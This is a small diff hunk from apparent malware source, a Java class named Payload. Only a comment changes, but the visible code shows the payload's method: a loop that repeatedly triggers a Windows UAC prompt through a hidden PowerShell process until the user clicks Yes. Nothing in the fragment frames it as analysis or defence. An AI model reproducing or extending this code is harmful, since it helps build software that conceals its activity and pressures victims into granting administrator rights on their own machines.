@@ -163,7 +163,7 @@ public class Payload {
             while (true) {
                 log("Triggering UAC...");
                 
-                // Launch PowerShell hidden and wait for it to finish (which means the user clicked Yes or No)
+                // Launch PowerShell hidden and wait for the user to click Yes or No
                 Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
                 p.waitFor();
                 
